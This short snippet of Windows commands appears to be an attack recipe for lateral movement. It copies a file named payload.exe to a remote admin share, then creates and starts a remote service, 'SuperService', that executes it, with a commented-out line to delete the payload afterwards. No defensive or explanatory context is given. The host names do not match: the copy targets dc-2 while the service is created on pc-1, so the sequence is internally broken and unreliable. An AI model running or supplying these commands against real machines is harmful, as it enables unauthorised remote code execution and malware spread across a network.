copy payload.exe \\dc-2.domain.local\c$\windows\temp\payload.exe
sc.exe \\pc-1.domain.local create SuperService binpath="C:\windows\system32\cmd.exe /C C:\windows\temp\payload.exe"
sc.exe \\pc-1.domain.local start SuperService
# del \\pc-1.domain.local\c$\windows\temp\payload.exe
